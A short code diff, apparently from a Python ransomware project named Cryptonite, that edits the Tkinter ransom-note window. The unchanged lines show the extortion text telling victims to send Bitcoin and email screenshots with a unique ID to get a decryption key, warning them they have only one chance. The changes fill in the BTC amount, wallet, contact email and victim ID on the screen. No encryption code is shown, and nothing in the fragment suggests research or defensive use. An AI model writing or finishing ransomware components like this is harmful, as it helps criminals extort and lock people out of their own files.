@@ -187,9 +187,9 @@ class System(Cryptonite):
         lbl_main1.grid(row = 5, column = 0, columnspan = 2)
         lbl_main1 = tk.Label(master = frm_main, text = "Don't worry! Your files can still be decrypted.\nYou just need to put in the correct DECRYPTION_KEY in the text box provided.\n\nIn order to get the DECRYPTION_KEY:\n\n1. Send us the specified amount of BTC to the address mentioned below. \n2. Send us the valid screenshots via email along with your UNIQUE_ID.    \n\nDo these and we will provide the correct DECRYPTION_KEY via mail.\n\nRemember! You will have only ONE CHANCE to enter the DECRYPTION_KEY.\n\nSo, do not try to be a Smart Alec.", font=("Apple Chancery", 15), bg = "black", fg = "#39ff14")
         lbl_main1.grid(row = 6, column = 0, columnspan = 2, padx = 5, pady = 3)
-        lbl_main1 = tk.Label(master = frm_main, text = f"BTC AMOUNT: \tBTC WALLET: \tEMAIL: \t", font=("Apple Chancery", 10), bg = "black", fg = "#39ff14")
+        lbl_main1 = tk.Label(master = frm_main, text = f"BTC AMOUNT: {BTC_AMOUNT}\tBTC WALLET: {BTC_WALLET}\tEMAIL: {EMAIL}\t", font=("Apple Chancery", 10), bg = "black", fg = "#39ff14")
         lbl_main1.grid(row = 7, column = 0, sticky = "w", columnspan = 2, pady = (10,3), padx = 3)
-        lbl_main1 = tk.Label(master = frm_main, text = f"UNIQUE_ID: ", font=("Apple Chancery", 10), bg = "black", fg = "#39ff14")
+        lbl_main1 = tk.Label(master = frm_main, text = f"UNIQUE_ID: {uniqKey}", font=("Apple Chancery", 10), bg = "black", fg = "#39ff14")
         lbl_main1.grid(row = 7, column = 0, sticky = "e", columnspan = 2,pady = (10,3), padx = 3)
 
         window.mainloop()
